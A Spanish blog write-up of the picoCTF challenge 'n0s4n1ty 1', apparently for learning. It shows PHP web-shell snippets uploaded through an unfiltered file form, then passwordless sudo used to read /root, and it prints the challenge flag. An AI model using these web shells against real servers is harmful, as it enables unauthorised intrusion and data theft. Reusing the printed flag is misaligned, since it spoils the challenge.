---
title: n0s4n1ty
date: 2025-03-29 19:00:00 +0200
categories: [writeup, picoctf]
tags: [picoctf, explotación web]     
image:
    path: https://picoctf.org/img/logos/pico-mark.svg
    alt: PicoCTF
---

n0s4n1ty 1

>Author: Prince Niyonshuti N.
Description 
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.
Additional details will be available after launching your challenge instance.
{: .prompt-tip }

Al lanzar la instancia tenemos acceso a una web donde aparece un formulario para subir un archivo. 

Bueno parece una oportunidad para subir una shell. La forma de aproximarse a estos formularios web es ver si la entrada está sanitizada. 
Sanitizar la entrada significa que a nivel de la aplicación, el código de la misma maneja que tipo de archivos se pueden subir, de que tamaño,
de que extensión y otros filtros que deberían comprobarse pero estos ejercicios suelen ser más sencillos que todo eso. 

The file c99.php has been uploaded Path: uploads/c99.php. Uso c99shell, hay muchas PHP shells [hacktools#web-shells](../hacktools#web-shells). Aunque tiene unas cuantas funcionalidades ya integradas con estos entornos no se puede ir tan a lo bestia, no funciona, así que probaré algo más manual. 

Codifico esta web en PHP, como no se sanitiza la entrada el servidor es posible que ejecute todo el código PHP que 
se encuentra dentro de las rutas de la aplicación incluido el directorio de uploads. Así que a subir una _webshell_ toca.
Poco a poco voy comprobando que la cosa funciona, prueba y error, determino la ruta completa hacia /root.

``` php
<?php
$output = shell_exec("pwd");
echo $output;
?>
```
Tengo resultados, el código se ha ejecutado, ahora sabemos que el archivo que hemos subido está exactamente en:
```/var/www/html/uploads ```

Después de hacer algunos cambios y resubir el archivo varias veces caigo en la cuenta de que con el directorio root no estoy teniendo suerte, añado una salida para comprobar que php se está ejecutando ```echo "Salida commando\n";```, así que añado sudo y descubro la sorpresa, el usuario actual ha sido añadido al fichero sudoers y ni siquiera necesita una password para ejecutar comandos del sistema.

``` php
<?php
$output = shell_exec("whoami");
echo "Salida commando\n";
echo $output;
?>
```

```Salida commando www-data```

``` php
<?php
$output = shell_exec("sudo ls ../../../../root/");
echo "Salida commando\n";
echo $output;
?>
```
```Salida commando flag.txt```

Codifico una última versión para capturar la banderita.
``` php
<?php
$output = shell_exec("sudo cat ../../../../root/flag.txt");
echo "Salida commando\n";
echo $output;
?>
```
```Salida commando picoCTF{wh47_c4n_u_d0_wPHP_a4ca6ea0}```

flag: **picoCTF{wh47_c4n_u_d0_wPHP_a4ca6ea0}**

Un buen ejemplo de como una mala praxis a la hora de asignar permisos a usuarios en este caso www-data en combinación con la falta de sanitización
de las entradas en la aplicación permite un RFI (Remote file inclusion) que se converte en un RCE (Remote code execution). Pues aunque el código PHP se ejecuta del lado del servidor la acción de visitar a la página subida es la que lleva a cabo la ejecución en el servidor remotamente. 
Sanitizen sus entradas o perezcan en el camino. 
